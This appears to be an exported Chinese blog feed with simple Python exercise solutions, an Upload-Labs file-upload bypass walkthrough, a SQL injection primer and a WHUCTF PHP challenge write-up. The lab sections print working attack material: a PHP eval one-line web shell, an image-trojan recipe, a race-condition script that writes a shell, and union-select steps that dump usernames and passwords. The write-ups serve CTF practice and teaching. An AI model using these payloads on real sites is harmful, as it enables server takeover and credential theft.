</li>
</ol>
<p>样例输出<br>　　71<br>　　4435274</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n=int(input())</span><br><span class="line">list1=[0]*n</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(n):</span><br><span class="line">    list1[i]=input()</span><br><span class="line"><span class="keyword">for</span> s <span class="keyword">in</span> list1:</span><br><span class="line">    str1=s</span><br><span class="line">    list1=[0]*(len(str1))</span><br><span class="line">    count1=0</span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str1:</span><br><span class="line">        <span class="keyword">if</span> i&lt;=<span class="string">'9'</span>:list1[count1]=int(i)</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">'A'</span>:list1[count1]=10</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">'B'</span>:list1[count1]=11</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">'C'</span>:list1[count1]=12</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">'D'</span>:list1[count1]=13</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">'E'</span>:list1[count1]=14</span><br><span class="line">        <span class="keyword">if</span> i==<span class="string">'F'</span>:list1[count1]=15</span><br><span class="line">        count1=count1+1</span><br><span class="line">    str2=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">        h_b=i</span><br><span class="line">        str1=<span class="string">""</span></span><br><span class="line">        <span class="keyword">while</span> h_b&gt;0:</span><br><span class="line">            n1=h_b%2</span><br><span class="line">            h_b=h_b//2</span><br><span class="line">            str1=str(n1)+str1</span><br><span class="line">        str2=str2+<span class="string">"&#123;:0&gt;4&#125;"</span>.format(str1)</span><br><span class="line"></span><br><span class="line">    add_0=3-(len(str2)%3)</span><br><span class="line">    str2=<span class="string">'0'</span>*add_0+str2</span><br><span class="line"></span><br><span class="line">    count3=0</span><br><span class="line">    count4=0</span><br><span class="line">    b_oct=0</span><br><span class="line">    result=<span class="string">""</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> str2:</span><br><span class="line">        b_oct=b_oct+int(i)*pow(2,2-count3) </span><br><span class="line">        count3=count3+1 </span><br><span class="line">        <span class="keyword">if</span> count3==3:</span><br><span class="line">            result=result+str(b_oct) </span><br><span class="line">            count3=0 </span><br><span class="line">            b_oct=0 </span><br><span class="line">    <span class="built_in">print</span>(result.lstrip(<span class="string">'0'</span>))</span><br></pre></td></tr></table></figure>
<h2 id="Huffuman树"><a href="#Huffuman树" class="headerlink" title="Huffuman树"></a>Huffuman树</h2><p>题目叙述：Huffman树在编码中有着广泛的应用。在这里，我们只关心Huffman树的构造过程。<br>给出一列数{pi}={p0, p1, …, pn-1}，用这列数构造Huffman树的过程如下：</p>
<ol>
<li>找到{pi}中最小的两个数，设为pa和pb，将pa和pb从{pi}中删除掉，然后将它们的和加入到{pi}中。这个过程的费用记为pa + pb。</li>
<li>重复步骤1，直到{pi}中只剩下一个数。<br>在上面的操作过程中，把所有的费用相加，就得到了构造Huffman树的总费用。<br>本题任务：对于给定的一个数列，现在请你求出用该数列构造Huffman树的总费用。<br>例如，对于数列{pi}={5, 3, 8, 2, 9}，Huffman树的构造过程如下：</li>
<li>找到{5, 3, 8, 2, 9}中最小的两个数，分别是2和3，从{pi}中删除它们并将和5加入，得到{5, 8, 9, 5}，费用为5。</li>
<li>找到{5, 8, 9, 5}中最小的两个数，分别是5和5，从{pi}中删除它们并将和10加入，得到{8, 9, 10}，费用为10。</li>
<li>找到{8, 9, 10}中最小的两个数，分别是8和9，从{pi}中删除它们并将和17加入，得到{10, 17}，费用为17。</li>
<li>找到{10, 17}中最小的两个数，分别是10和17，从{pi}中删除它们并将和27加入，得到{27}，费用为27。</li>
<li>现在，数列中只剩下一个数27，构造过程结束，总费用为5+10+17+27=59。<br>输入描述:<br>输入的第一行包含一个正整数n（n&lt;=100）。<br>接下来是n个正整数，表示p0, p1, …, pn-1，每个数不超过1000。<br>输入样例:<br>5<br>5 3 8 2 9<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n=int(input())</span><br><span class="line">str1=input()</span><br><span class="line">list1=str1.split()</span><br><span class="line">count=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    list1[count]=int(i)</span><br><span class="line">    count=count+1</span><br><span class="line">result=0</span><br><span class="line"><span class="keyword">while</span> n&gt;1:</span><br><span class="line">    list1.sort()</span><br><span class="line">    tmp=list1[0]+list1[1]</span><br><span class="line">    del list1[0:2]</span><br><span class="line">    list1.insert(0,tmp)</span><br><span class="line">    n=n-1</span><br><span class="line">    result=result+tmp</span><br><span class="line"><span class="built_in">print</span>(result)</span><br></pre></td></tr></table></figure>
<h2 id="查找整数"><a href="#查找整数" class="headerlink" title="查找整数"></a>查找整数</h2>题目叙述：给出一个包含n个整数的数列，问整数a在数列中的第一次出现是第几个。<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">n=int(input())</span><br><span class="line">str1=input()</span><br><span class="line">list1=str1.split()</span><br><span class="line">a=input()</span><br><span class="line">count=1</span><br><span class="line">judge=0</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> list1:</span><br><span class="line">    <span class="keyword">if</span> i==a:</span><br><span class="line">        <span class="built_in">print</span>(count)</span><br><span class="line">        judge=1</span><br><span class="line">        <span class="built_in">break</span></span><br><span class="line">    count=count+1</span><br><span class="line"><span class="keyword">if</span> judge==0:<span class="built_in">print</span>(<span class="string">"-1"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="闰年判断"><a href="#闰年判断" class="headerlink" title="闰年判断"></a>闰年判断</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">year=int(input())</span><br><span class="line"><span class="keyword">if</span> year%4==0 and year%400!=0:<span class="built_in">print</span>(<span class="string">"yes"</span>)</span><br><span class="line"><span class="keyword">elif</span> year%400==0:<span class="built_in">print</span>(<span class="string">"yes"</span>)</span><br><span class="line"><span class="keyword">else</span>:<span class="built_in">print</span>(<span class="string">"no"</span>)</span><br></pre></td></tr></table></figure>
<h2 id="最长字符串"><a href="#最长字符串" class="headerlink" title="最长字符串"></a>最长字符串</h2>题目叙述：求出5个字符串中最长的字符串。每个字符串长度在100以内，且全为小写字母<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str1=input()</span><br><span class="line">list1=str1.split()</span><br><span class="line">list2=[0]*5</span><br><span class="line">dic=&#123;&#125;</span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> range(5):</span><br><span class="line">    dic[len(list1[i])]=list1[i]</span><br><span class="line">    list2[i]=len(list1[i])</span><br><span class="line">list2.sort()</span><br><span class="line"><span class="built_in">print</span>(dic.get(list2[4]))</span><br></pre></td></tr></table></figure>



</li>
</ol>
]]></content>
      <categories>
        <category>编程</category>
      </categories>
  </entry>
  <entry>
    <title>Upload-Labs</title>
    <url>/2020/02/17/Upload-Labs/</url>
    <content><![CDATA[<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload.jpg" alt=""></p>
<a id="more"></a>
<h2 id="Pass-01-js前端验证"><a href="#Pass-01-js前端验证" class="headerlink" title="Pass-01(js前端验证)"></a>Pass-01(js前端验证)</h2><p>上传zx.php文件，弹出一个弹框<br>弹框说明是通过前端js代码来判断文件类型的<br>禁用js,或者控制台执行以下命令</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="keyword">function</span> <span class="function"><span class="title">checkFile</span></span>()&#123;&#125;</span><br></pre></td></tr></table></figure>
<p>这样就将本身的检测函数覆盖掉了,直接上传即可</p>
<h2 id="Pass-02-MIME类型验证"><a href="#Pass-02-MIME类型验证" class="headerlink" title="Pass-02(MIME类型验证)"></a>Pass-02(MIME类型验证)</h2><p>上传zx.php文件，显示 文件类型不正确，请重新上传！<br>用burp抓包<br>改包   Content-Type: image/gif<br>放包即可</p>
<h2 id="Pass-03-扩展名验证"><a href="#Pass-03-扩展名验证" class="headerlink" title="Pass-03(扩展名验证)"></a>Pass-03(扩展名验证)</h2><p>修改后缀名为.phtml即可</p>
<h2 id="Pass-04-htaccess文件解析漏洞"><a href="#Pass-04-htaccess文件解析漏洞" class="headerlink" title="Pass-04(.htaccess文件解析漏洞)"></a>Pass-04(.htaccess文件解析漏洞)</h2><p>发现没有过滤.htaccess文件<br>文件解析规则绕过<br>上传一个.htaccess文件<br>文件内容为：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">SetHandler application/x-httpd-php</span><br></pre></td></tr></table></figure>
<p>这样所有文件都会被解析成php<br>制作一个图片马，上传即可，这样文件就会被解析为php文件<br>图片马制作过程如下：<br>一张普通照片1.jpg<br>一个写有一句话木马的2.php文件，内容为</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php @<span class="built_in">eval</span>(<span class="variable">$_POST</span>[<span class="string">"pass"</span>]); <span class="built_in">echo</span> <span class="string">"success"</span>?&gt;</span><br></pre></td></tr></table></figure>
<p>命令提示符下执行以下命令：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">copy 1.jpg/b+2.php/a upload.jpg</span><br></pre></td></tr></table></figure>
<p>其中b是指二进制，a是指ASCII,upload.jpg就是最后生成的图片马</p>
<h2 id="Pass-05-扩展名大写绕过"><a href="#Pass-05-扩展名大写绕过" class="headerlink" title="Pass-05(扩展名大写绕过)"></a>Pass-05(扩展名大写绕过)</h2><p>源码中发现没有将文件后缀名大小写统一处理，即后缀名大小写绕过<br>上传upload.PHP即可<br>常见扩展名绕过：</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">asp:asa,cer,cdx</span><br><span class="line">aspx:ashx,asmx,ascx</span><br><span class="line">php:php2、php3、php4、php5、phps、phtml</span><br><span class="line">jsp:jspx,jspf</span><br></pre></td></tr></table></figure>
<h2 id="Pass-06-扩展名末尾空格绕过"><a href="#Pass-06-扩展名末尾空格绕过" class="headerlink" title="Pass-06(扩展名末尾空格绕过)"></a>Pass-06(扩展名末尾空格绕过)</h2><p>源码中发现没有对文件后缀名进行去空处理，可在后缀名后加入空格绕过<br>burpsuite抓包，修改文件名为’11.php ‘</p>
<h2 id="Pass-07-扩展名末尾加-绕过"><a href="#Pass-07-扩展名末尾加-绕过" class="headerlink" title="Pass-07(扩展名末尾加.绕过)"></a>Pass-07(扩展名末尾加.绕过)</h2><p>源码中发现没有对文件后缀名末尾进行去’.’处理，利用windows特性，会自动去掉后缀名中最后的’.’,可在后缀名后加上’.’来绕过,即upload.php.</p>
<h2 id="Pass-08-扩展名末尾加-DATA绕过"><a href="#Pass-08-扩展名末尾加-DATA绕过" class="headerlink" title="Pass-08(扩展名末尾加::$DATA绕过)"></a>Pass-08(扩展名末尾加::$DATA绕过)</h2><p>源码中发现没有对文件后缀名进行去’::$DATA’处理，可在后缀名后加上’::$DATA’来绕过，即上传upload.php::$DATA。但是没法getshell,原因是这个靶机是linux系统，而这是windows特性，且必须是php,必须是那个源文件。php在windows的时候如果文件名+”::$DATA”会把::$DATA之后的数据当成文件流处理，不会检测后缀名，且保持”::$DATA”之前的文件名，他的目的就在于不检查后缀名</p>
<h2 id="Pass-09-文件路径可控-空格-绕过"><a href="#Pass-09-文件路径可控-空格-绕过" class="headerlink" title="Pass-09(文件路径可控.空格.绕过)"></a>Pass-09(文件路径可控.空格.绕过)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$img_path</span> = UPLOAD_PATH.<span class="string">'/'</span>.<span class="variable">$file_name</span>;</span><br></pre></td></tr></table></figure>
<p>上传文件路径是通过拼接处理的，即可构造11.php.空格.,然后末尾的点又被除去,该文件被处理后会变成11.php.,这样就可绕过了</p>
<h2 id="Pass-10-针对str-ireplace函数双写后缀绕过"><a href="#Pass-10-针对str-ireplace函数双写后缀绕过" class="headerlink" title="Pass-10(针对str_ireplace函数双写后缀绕过)"></a>Pass-10(针对str_ireplace函数双写后缀绕过)</h2><p>上传文件的后缀名若在黑名单中，则会被替换为空，那么就可以通过双写来绕过，即上传11.pphphp</p>
<h2 id="Pass-11-get方式路径可控-00截断"><a href="#Pass-11-get方式路径可控-00截断" class="headerlink" title="Pass-11(get方式路径可控%00截断)"></a>Pass-11(get方式路径可控%00截断)</h2><p>%00对PHP版本有要求<br>0、php版本必须小于5.3.4<br>1、magic_quotes_gpc必须为Off<br>而这个靶机php版本为7.2.21,所以利用失败了</p>
<h2 id="Pass-12-post方式路径可控-00截断"><a href="#Pass-12-post方式路径可控-00截断" class="headerlink" title="Pass-12(post方式路径可控%00截断)"></a>Pass-12(post方式路径可控%00截断)</h2><p>同Pass-11</p>
<h2 id="Pass-13-校验文件头，图片马-文件包含漏洞"><a href="#Pass-13-校验文件头，图片马-文件包含漏洞" class="headerlink" title="Pass-13(校验文件头，图片马+文件包含漏洞)"></a>Pass-13(校验文件头，图片马+文件包含漏洞)</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="variable">$bin</span> = fread(<span class="variable">$file</span>, 2); //只读2字节</span><br></pre></td></tr></table></figure>
<p>发现只对文件的头2个字节做检测,可以利用图片马<br>先将图片马上传<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass13_0.jpg" alt=""><br>然后点击文件包含漏洞</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">/*</span><br><span class="line">本页面存在文件包含漏洞，用于测试图片马是否能正常运行！</span><br><span class="line">*/</span><br><span class="line">header(<span class="string">"Content-Type:text/html;charset=utf-8"</span>);</span><br><span class="line"><span class="variable">$file</span> = <span class="variable">$_GET</span>[<span class="string">'file'</span>];</span><br><span class="line"><span class="keyword">if</span>(isset(<span class="variable">$file</span>))&#123;</span><br><span class="line">    include <span class="variable">$file</span>;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    show_source(__file__);</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>利用文件包含漏洞来包含刚上传的图片马<br>payload:?file=?file=upload/8820200706111144.png<br>成功getshell了<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass13_1.jpg" alt=""></p>
<h2 id="Pass-14-getimagesize绕过，图片马-文件包含漏洞"><a href="#Pass-14-getimagesize绕过，图片马-文件包含漏洞" class="headerlink" title="Pass-14(getimagesize绕过，图片马+文件包含漏洞)"></a>Pass-14(getimagesize绕过，图片马+文件包含漏洞)</h2><p>getimagesize获取文件类型，还是直接就可以利用图片马就可进行绕过<br>方法同Pass-13</p>
<h2 id="Pass-15-exif-imagetype绕过，图片马-文件包含漏洞"><a href="#Pass-15-exif-imagetype绕过，图片马-文件包含漏洞" class="headerlink" title="Pass-15(exif_imagetype绕过，图片马+文件包含漏洞)"></a>Pass-15(exif_imagetype绕过，图片马+文件包含漏洞)</h2><p>exif_imagetype — 判断一个图像的类型<br>同Pass-14</p>
<h2 id="Pass-16-二次渲染"><a href="#Pass-16-二次渲染" class="headerlink" title="Pass-16(二次渲染)"></a>Pass-16(二次渲染)</h2><p>imagecreatefrom 系列函数用于从文件或 URL 载入一幅图像，成功返回图像资源，失败则返回一个空字符串。<br>该系列函数有：<br>imagecreatefromgif()：创建一块画布，并从 GIF 文件或 URL 地址载入一副图像<br>imagecreatefromjpeg()：创建一块画布，并从 JPEG 文件或 URL 地址载入一副图像<br>imagecreatefrompng()：创建一块画布，并从 PNG 文件或 URL 地址载入一副图像<br>imagecreatefromwbmp()：创建一块画布，并从 WBMP 文件或 URL 地址载入一副图像<br>imagecreatefromstring()：创建一块画布，并从字符串中的图像流新建一副图像<br>上传图片马，但是并不能getshell,将上传的图片马下载下来，用16进制编辑器打开，可以发现里面的一句话木马被去除了。所以需要在图片中找到没被改变的部分，将一句话木马放在这里，再次上传就可getshell了</p>
<h2 id="Pass-17-unlink-条件竞争"><a href="#Pass-17-unlink-条件竞争" class="headerlink" title="Pass-17(unlink,条件竞争)"></a>Pass-17(unlink,条件竞争)</h2><p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass17_0.jpg" alt=""><br>如果上传符合后缀的文件，会被rename函数重命名，那样就无法拿到文件的路径了<br>如果直接上传包含一句话木马的php文件，但是当代码会检测到上传的是php文件时，就会执行unlink删除该文件，那么我们可以通过条件竞争的方式在unlink之前getshell,为了一直能getshell，可以在上传的write.php文件中写入以下代码</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php </span><br><span class="line"><span class="variable">$myfile</span>=fopen(<span class="string">"shell.php"</span>,<span class="string">"w"</span>) or die(<span class="string">"error"</span>);</span><br><span class="line"><span class="variable">$shell</span>=<span class="string">'&lt;?php @eval($_POST["pass"]); echo "success"?&gt;'</span>;</span><br><span class="line">fwrite(<span class="variable">$myfile</span>,<span class="variable">$shell</span>);</span><br><span class="line">fclose(<span class="variable">$myfile</span>);</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>在unlink之前执行write.php就可以在同一目录下产生一个shell.php，我们就可以通过shell.php来getshell了<br>为了增大write.php被执行的概率，这里使用burp中的intruder模块，在其中add一个变量$a$，用于intruder模块不断发包，burp开始攻击后，在浏览器不断访问write.php文件，攻击结束后访问shell.php<br><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/BUUCTF-Web/upload-labs/upload_pass17_1.jpg" alt=""><br>成功getshell</p>
<h2 id="Pass-18-rename-条件竞争"><a href="#Pass-18-rename-条件竞争" class="headerlink" title="Pass-18(rename,条件竞争)"></a>Pass-18(rename,条件竞争)</h2><p>对上传文件后缀名进行判断，检查了文件大小，文件是否已经存在等。如果文件能够上传成功，会对文件重命名<br>这里就产生了条件竞争漏洞，只要赶在rename执行之前getshell就可</p>
<h2 id="服务器解析漏洞"><a href="#服务器解析漏洞" class="headerlink" title="服务器解析漏洞"></a>服务器解析漏洞</h2><h3 id="IIS-IIS6-0"><a href="#IIS-IIS6-0" class="headerlink" title="IIS(IIS6.0)"></a>IIS(IIS6.0)</h3><p>Windows server 2003广泛存在该漏洞<br>目录解析漏洞：形如1.asp/2.jpg<br>这里的1.asp是文件夹名，2.jpg是文件名<br>文件解析漏洞：形如1.asp;.jpg<br>IIS会把这里的jpg文件解析为asp文件</p>
<h3 id="Nginx"><a href="#Nginx" class="headerlink" title="Nginx"></a>Nginx</h3><p>形如1.jpg/2.php<br>这里的2.php并不存在，就会将1.jpg文件解析为php文件</p>
<h3 id="Apache"><a href="#Apache" class="headerlink" title="Apache"></a>Apache</h3><p>形如1.php.xxx<br>这里的xxx是指Apache不可识别的扩展名，例如1.php.rar<br>对于Apache低版本来说，扩展名是从右向左识别的，当遇到不可识别的扩展名时，它会跳过，继续向左寻找可识别的扩展名，例如这里的1.php.rar,由于rar对于Apache来说是不可识别的，就会向左继续寻找，发现php可以识别那么1.php.rar就会被识别为php文件</p>
]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>SQL注入前导</title>
    <url>/2020/03/02/SQL%E6%B3%A8%E5%85%A5%E5%89%8D%E5%AF%BC/</url>
    <content><![CDATA[<h2 id="MySql数据库"><a href="#MySql数据库" class="headerlink" title="MySql数据库"></a>MySql数据库</h2><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">查询当前所有的数据库：show databases;</span><br><span class="line">创建一个新的数据库：create database DBName;</span><br><span class="line">选择DBName数据库：use DBName;</span><br><span class="line">进入DBName数据库后，查询该数据库中的所有表：show tables;</span><br><span class="line">显示users表的结构：describe users;    或者    show columns from users;</span><br><span class="line">单行注释有<span class="comment">#和--,在实际的操作中#一般用%23来代替，--用--+来代替。因为在URL中，如果在最后加上--，那么浏览器在发送请求的时候会把URL末尾的空格舍去，而用--+代替--，原因是+在URL被URL编码后会变成空格。</span></span><br><span class="line">group_concat() 字符串连接</span><br></pre></td></tr></table></figure>
<a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">mysql数据库默认有一张名为：information_schema的数据库，主要查schema表和tables表，schema表是用来存储该用户创建的所有数据库的库名，tables是用来存储用户创建所有数据的库名和表名，字段分别为table_schema和table_name</span><br><span class="line">SCHEMA_NAME 表示数据库名称 </span><br><span class="line">table_schema 表示表所属的数据库名称</span><br><span class="line">table_name 表示表的名称</span><br></pre></td></tr></table></figure>
<p>判断注入点：单引号，双引号，and 1=1，and 1=2</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">爆所有数据库名 </span><br><span class="line">(select group_concat(SCHEMA_NAME) from information_schema.schemata)</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">爆当前库的所有表 </span><br><span class="line">select group_concat(table_name) from information_schema.tables <span class="built_in">where</span> table_schema=database()</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">得到表中的字段名 将敏感的表进行16进制编码tablename=0x7461626C656E616D65 </span><br><span class="line">select group_concat(column_name) from information_schema.columns <span class="built_in">where</span> table_name=0x7461626C656E616D65</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">得到字段具体的值 </span><br><span class="line">select group_concat(id,fl4g) from secret_table</span><br><span class="line">select group_concat(id,username,password) from users--+</span><br></pre></td></tr></table></figure>
<h3 id="攻击步骤"><a href="#攻击步骤" class="headerlink" title="攻击步骤"></a>攻击步骤</h3><figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">1.确定注入点后 order by 1 ，返回正常数字1换2，一次向上加，加到页面报错。</span><br><span class="line">2.如果order by 6错误，order by 5正常，即可确定字段数为5</span><br><span class="line">3.查看回显点 and 1=2 union select 1,2,3,4,5 在出现数字的位置进行查数据，如页面出现数字2</span><br><span class="line">4.查数据库名字：and 1=2 union select 1,database(),3,4,5 出现数字2的位置会出现数据库名字</span><br><span class="line">5.查表 and 1=2 union select 1,group_concat(table_name),3,4,5 from information_schema.tables <span class="built_in">where</span> table_schema=‘数据库名称’</span><br><span class="line">6.查列 and 1=2 union select 1,group_concat(column_name),3,4,5 from information_schema.columns <span class="built_in">where</span> table_name=‘表名’</span><br><span class="line">7.查内容 and 1=2 union select 1,group_concat(username,password) from admin</span><br></pre></td></tr></table></figure>]]></content>
      <categories>
        <category>CTF-Web</category>
      </categories>
  </entry>
  <entry>
    <title>WHUCTF</title>
    <url>/2020/05/23/WHUCTF/</url>
    <content><![CDATA[<h3 id="Web"><a href="#Web" class="headerlink" title="Web"></a>Web</h3><h4 id="ezphp"><a href="#ezphp" class="headerlink" title="ezphp"></a>ezphp</h4><a id="more"></a>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">error_reporting(0);</span><br><span class="line">highlight_file(__file__);</span><br><span class="line"><span class="variable">$string_1</span> = <span class="variable">$_GET</span>[<span class="string">'str1'</span>];</span><br><span class="line"><span class="variable">$string_2</span> = <span class="variable">$_GET</span>[<span class="string">'str2'</span>];</span><br><span class="line"></span><br><span class="line">//1st</span><br><span class="line"><span class="keyword">if</span>(<span class="variable">$_GET</span>[<span class="string">'num'</span>] !== <span class="string">'23333'</span> &amp;&amp; preg_match(<span class="string">'/^23333$/'</span>, <span class="variable">$_GET</span>[<span class="string">'num'</span>]))&#123;</span><br><span class="line">    <span class="built_in">echo</span> <span class="string">'1st ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'会代码审计嘛23333'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//2nd</span><br><span class="line"><span class="keyword">if</span>(is_numeric(<span class="variable">$string_1</span>))&#123;</span><br><span class="line">    <span class="variable">$md5_1</span> = md5(<span class="variable">$string_1</span>);</span><br><span class="line">    <span class="variable">$md5_2</span> = md5(<span class="variable">$string_2</span>);</span><br><span class="line">    <span class="keyword">if</span>(<span class="variable">$md5_1</span> != <span class="variable">$md5_2</span>)&#123;</span><br><span class="line">        <span class="variable">$a</span> = strtr(<span class="variable">$md5_1</span>, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="variable">$b</span> = strtr(<span class="variable">$md5_2</span>, <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$a</span> == <span class="variable">$b</span>)&#123;</span><br><span class="line">            <span class="built_in">echo</span> <span class="string">'2nd ok'</span>.<span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span>&#123;</span><br><span class="line">            die(<span class="string">"can u give me the right str???"</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125; </span><br><span class="line">    <span class="keyword">else</span>&#123;</span><br><span class="line">        die(<span class="string">"no!!!!!!!!"</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">else</span>&#123;</span><br><span class="line">    die(<span class="string">'is str1 numeric??????'</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">//3nd</span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$string</span>)&#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">'username'</span>];</span><br><span class="line"><span class="variable">$password</span> = <span class="string">"aaaaa"</span>;</span><br><span class="line"><span class="variable">$user</span> = array(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$r</span> = filter(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="keyword">if</span>(unserialize(<span class="variable">$r</span>)[1] == <span class="string">"123456"</span>)&#123;</span><br><span class="line">    <span class="built_in">echo</span> file_get_contents(<span class="string">'flag.php'</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>第一关：利用%0a绕过(%0a经过url编码后时回车)<br>第二关：0e绕过(找到两个数，md5后都是0e开头的就可)</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="variable">$count</span> = 0;</span><br><span class="line"><span class="keyword">for</span> (<span class="variable">$i</span> = 1; <span class="variable">$i</span> &lt;= 100000000; <span class="variable">$i</span>++) &#123;</span><br><span class="line">    <span class="variable">$md5</span> = strtr(md5(<span class="variable">$i</span>), <span class="string">'pggnb'</span>, <span class="string">'12345'</span>);</span><br><span class="line">    <span class="keyword">if</span> (preg_match(<span class="string">'/^0e\d+$/'</span>, <span class="variable">$md5</span>)) &#123;</span><br><span class="line">        <span class="built_in">echo</span> <span class="variable">$i</span> . <span class="string">" "</span> . md5(<span class="variable">$i</span>) . <span class="string">"&lt;br&gt;"</span>;</span><br><span class="line">        <span class="variable">$count</span>++;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">if</span> (<span class="variable">$count</span> == 2) &#123;</span><br><span class="line">        <span class="built_in">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">str1=11230178&amp;str2=20493141</span><br></pre></td></tr></table></figure>
<p>第三关：php反序列化字符逃逸</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line"><span class="keyword">function</span> filter(<span class="variable">$string</span>)&#123;</span><br><span class="line">    <span class="built_in">return</span> preg_replace(<span class="string">'/x/'</span>, <span class="string">'yy'</span>, <span class="variable">$string</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$username</span> = <span class="string">'123456xxxxxxxxxxxxxxxxxxxx";i:1;s:6:"123456";&#125;'</span>;</span><br><span class="line"><span class="variable">$password</span> = <span class="string">"aaaaa"</span>;</span><br><span class="line"><span class="variable">$user</span> = array(<span class="variable">$username</span>, <span class="variable">$password</span>);</span><br><span class="line"><span class="variable">$r</span> = filter(serialize(<span class="variable">$user</span>));</span><br><span class="line"><span class="built_in">echo</span> <span class="variable">$r</span>;</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line"><span class="built_in">echo</span> serialize(<span class="variable">$user</span>);</span><br><span class="line"><span class="built_in">echo</span> <span class="string">"&lt;br/&gt;"</span>;</span><br><span class="line">var_dump(unserialize(<span class="variable">$r</span>));</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p><img src="https://gitee.com/zxfireworks/BlogPic/raw/master/WHUCTF/whuctf_serialize.jpg" alt=""><br>下面是最终payload</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">?num=2333%0a&amp;str1=11230178&amp;str2=20493141</span><br><span class="line">以post方式传入username=123456xxxxxxxxxxxxxxxxxxxx<span class="string">";i:1;s:6:"</span>123456<span class="string">";&#125;</span></span><br></pre></td></tr></table></figure>
<p>在源码中就可发现flag</p>
